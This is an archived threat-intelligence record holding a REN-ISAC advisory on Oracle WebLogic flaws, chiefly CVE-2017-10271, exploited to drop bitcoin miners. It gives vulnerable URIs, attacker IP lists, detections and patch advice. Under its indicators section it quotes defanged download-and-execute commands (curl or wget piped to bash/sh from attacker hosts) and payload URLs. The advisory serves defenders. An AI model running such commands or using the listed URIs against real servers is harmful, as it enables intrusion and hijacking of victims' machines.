{
    "id": "ed8bc7f9-d56c-4238-8ee2-504e43884d75",
    "created_at": "2022-10-25T16:48:12.960153Z",
    "updated_at": "2025-03-27T02:06:11.601021Z",
    "deleted_at": null,
    "sha1_hash": "e9f9ed07fdce8afc6cca5331bd0227980ead5d79",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-01-05T15:24:58Z",
    "file_modification_date": "2018-01-05T15:24:58Z",
    "file_size": 266838,
    "plain_text": "## REN-ISAC Security Advisory January 5, 2018\n\n# Oracle WebLogic Vulnerability Being Exploited by Bitcoin Miners\n\nAudience: IT Executives and Technical Staff; TLP:WHITE (Public Distribution)\n\n## EXECUTIVE SUMMARY\n\nREN-ISAC has received widespread reports from university and research institutions about Oracle\nWebLogic vulnerabilit(ies) exploited by attackers to run bitcoin mining malware. The first reported\nobservation was December 13, 2017; malicious activity continues through to the date of this Advisory.\n\nOracle WebLogic Server is an enterprise Java EE web application server. Typical applications, used in the\nhigher education and research communities, that rely on WebLogic Server include PeopleSoft, Banner,\nOracle Identity Manager, and locally-developed applications.\n\nOne or more of the Oracle WebLogic vulnerabilities listed below are suspected to be in use by the\nattackers. They are listed in reverse chronological order by the associated Oracle patch. NOTE:\nRegarding the most recent, CVE-2017-10271, rated CRITICAL, with patch availability of October 2017;\nbecause of complexity of patching business-critical Oracle systems, there are possibly many systems\nwithout the October 2017 patches applied. Concerning CVE-2017-10271, the National Vulnerability\nDatabase states: \"Easily exploitable vulnerability allows unauthenticated attacker with network access\nvia HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in\ntakeover of Oracle WebLogic Server.\"\n\nNIST NVD CVE-2017-10271 Detail: https://nvd.nist.gov/vuln/detail/CVE-2017-10271\n\nBREACH REPORTING CONSIDERATIONS: So far, affected sites have no evidence of loss or exposure of\nrecords; evaluation on this will continue.\n\n**RECOMMENDATION: Apply Oracle patches covering the CVEs reported below and review the timeliness**\nand thoroughness of your patching process.\n\n## TECHNICAL DETAILS\n\nPrior to an actual attack your address space may be scanned for targets. Target ports include but are not\nlimited to: TCP/80, 443, 7001, 8080, 8888, 9000.\n\nIP addresses and domain names observed to be involved in the malicious activity are listed below.\n\nTo execute the initial attack a WebLogic Server URI is hit, commonly /wls-wsat/CoordinatorPortType.\nVarious URIs confirmed vulnerable to CVE-2017-10271 are listed below.\n\nMiners dropped onto compromised systems include:\nhttps://www.virustotal.com/#/file/63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017/details\nhttps://www.virustotal.com/#/file/bbc6f1e5f02b55fab111202b7ea2b3ef7b53209f6ce53f27d7f16c08f52ef9ac/details\nccminer/2.2\nccminer/1.8-dev\n\n1\n\n\n-----\n\nDetections for the WebLogic attacks are available in:\nPalo Alto: Oracle WebLogic WLS Security Component Remote Code Execution Vulnerability (38865)\nBig-IP ASM: https://devcentral.f5.com/articles/oracle-weblogic-wls-security-component-remote-code-execution-cve-201710271-29308\n\nDetections for active miners:\nET POLICY W32/BitCoinMiner.MultiThreat Subscribe/Authorize Stratum Protocol Message\nSANS beta feed of miner IPs: https://isc.sans.edu/api/threatlist/miner\n\nDetections, additional:\nMonitor for traffic to the IP addresses and WebLogic URIs identified below.\n\nMitigations:\nBlock requests to /wls-wstat/*\n\n**Additional Miscellaneous Indications**\n\nOn a compromised WebLogic server, the following has been seen to initiate mining:\ncurl -s http[:]//165.227.215[.]212:8220/logo5.jpg | bash –s\nlogo5.jpg is a shell script\naddresses seen in the script include:\nhttp[:]//165.227.215[.]212:8220/logo5.jpg\nhttp[:]//165.227.215[.]212:8220/config_1.json\nhttp[:]//165.227.215[.]212:8220/gcc\nhttp[:]//165.227.215[.]212:8220/c1.json\nhttp[:]//165.227.215[.]212:8220/minerd\nhttp[:]//165.227.215[.]212:8220/kworker.json\nhttp[:]//165.227.215[.]212:8220/atd2\nhttp[:]//165.227.215[.]212:8220/atd3\nhttp[:]//165.227.215[.]212:8220/yam\n\nMore than one reporter indicated affected servers running high CPU usage.\n\nMore than one reporter indicated compromised machines talking back to IPs at destination port\nTCP/8220.\n\nOne reporter: Each of 3 compromised systems were talking back to 67.21.81.179:8220. The one not\ndoing the BTC mining had an inbound SSH connection from 58.218.198.162:45987.\n\nSource & URL requested on the two servers doing the BTC mining:\n35.194.156.203 requested: /wls-wsat/CoordinatorPortType\n\nThese URLS were requested by systems that were doing the BTC mining:\n35.194.156.203:80/config_1.json\n35.194.156.203:80/gcc\n35.194.156.203:80/ftw.sh\n\n\n2\n\n\n-----\n\nOne reporter: A process masqueraded as wipefs proved to be miner malware. The malware was\noriginally downloaded to /tmp on 12/18 as a file named “vget”. The system also had a crontab running\nthat would start the malicous process every six hours.\n\nOne reporter: On one system they dropped by jvs and vps:\n$ll /var/tmp\ntotal 5832\n-rw-r--r-- 1 psoft psft   450 Dec 26 02:57 config.json\n-rwxrwxrwx 1 psoft psft 2979640 Dec 20 11:32 jvs\n-rwxrwxrwx 1 psoft psft 2979640 Dec 26 02:57 vps\n$ps -ef | grep vps\npsoft  38837   1 99 2017 ?    8-18:45:33 ./vps -c config.json -t 3\n\nOne reporter: Eight servers were compromised on the 23rd and 24th of December. Two things caught\nattention: high CPU usage, and all of the crontab entries were removed and replaced with wget –q\nhttp[:]//67.21.81[.]179:8220/logo4.jpg -O - | sh. Several VPS files were discovered in the tmp directory\non each of the 8 servers.\n\n**Suspected WebLogic Vulnerabiliies**\n\nCVE-2017-10271 CRITICAL\nOracle Critical Patch Update Advisory - October 2017\nhttps://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html\n\nCVE-2017-3248\nOracle Critical Patch Update Advisory - January 2017\nhttp://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html\n\nCVE-2015-4852\nOracle Critical Patch Update Advisory - October 2016\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html\nhttps://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html\n\nCVE-2016-5535\nOracle Critical Patch Update Advisory - October 2016\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html\n\nCVE-2016-3510\nOracle Critical Patch Update Advisory - July 2016\nhttp://www.oracle.com/technetwork/security-advisory/cpujul2016-2881720.html\n\nCVE-2016-0638\nOracle Critical Patch Update CVSS V2 Risk Matrices - April 2016\nhttps://www.oracle.com/technetwork/topics/security/cpuapr2016-2881694.html\n\n3\n\n\n-----\n\n**WEBLOGIC URIs Found Vulnerable to CVE-2017-10271**\n\n/wls-wsat/CoordinatorPortType\n/wls-wsat/CoordinatorPortType11\n/wls-wsat/ParticipantPortType\n/wls-wsat/ParticipantPortType11\n/wls-wsat/RegistrationPortTypeRPC\n/wls-wsat/RegistrationPortTypeRPC11\n/wls-wsat/RegistrationRequesterPortType\n/wls-wsat/RegistrationRequesterPortType11\n\n**IP Addresses Observed To Be Involved In Malicious Activity**\n\nAddresses are classified (best effort) here as scanners, attack/download, post-compromise, and\nunclassified (not identified when reported). A single IP may be reported in more than one class.\n\nScanners:\n45.77.24.16\n222.175.17.102\n111.10.72.130\n69.165.65.169\n111.223.246.13\n45.63.122.185\n70.42.131.170\n111.199.189.201\n43.255.225.28\n199.188.104.74\n43.252.210.16\n\nAttack/Download:\n142.4.124.82\n165.227.215.212\n86.183.127.105\n72.11.140.178\n5.188.86.30\n37.220.35.202\n51.15.81.183\n67.21.81.194\n80.208.231.77\n85.248.227.165\n149.56.223.241\n176.10.99.196\n176.107.183.166\n199.249.223.43\n199.249.223.46\n109.69.67.17\n\n\n4\n\n\n-----\n\n142.4.124.25\n154.16.149.74\n193.90.12.118\n35.194.156.203\n58.218.198.162\n67.21.81.179\n\nPost Compromise\n199.188.104.74 (tcp 511 and 5452 ports on the 25th and 28th)\n43.252.210.16 (tcp 555 on the 25th and 26th)\n169.62.79.78\n198.11.220.44\n45.77.106.29\n185.216.117.85\n\nUnclassified:\n23.239.8.60\n43.248.103.2\n37.59.54.205\n188.165.254.85\n78.46.91.134\n91.121.2.76\n37.59.56.102\n104.236.71.60\n86.183.127.10\n46.105.103.169\n78.46.91.171\n\n**Domain Names**\n\npool.minexmr[.]com\ncryptonight.usa.nicehash[.]com.\nneoscrypt.usa.nicehash[.]com\nscrypt.usa.nicehash[.]com\n\n## Feedback on this Advisory?\n\nWe welcome your feedback. Please send comments or suggestions to soc@ren-isac.net\n\n\n5\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.ren-isac.net/public-resources/alerts/REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf"
    ],
    "report_names": [
        "REN-ISAC_ADVISORY_Oracle_WebLogic_Vulnerability_Bitcoin_Miner_Attacks_20180105v1.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041171,
    "ts_creation_date": 1515165898,
    "ts_modification_date": 1515165898,
    "files": {
        "pdf": "https://archive.orkl.eu/e9f9ed07fdce8afc6cca5331bd0227980ead5d79.pdf",
        "text": "https://archive.orkl.eu/e9f9ed07fdce8afc6cca5331bd0227980ead5d79.txt",
        "img": "https://archive.orkl.eu/e9f9ed07fdce8afc6cca5331bd0227980ead5d79.jpg"
    }
}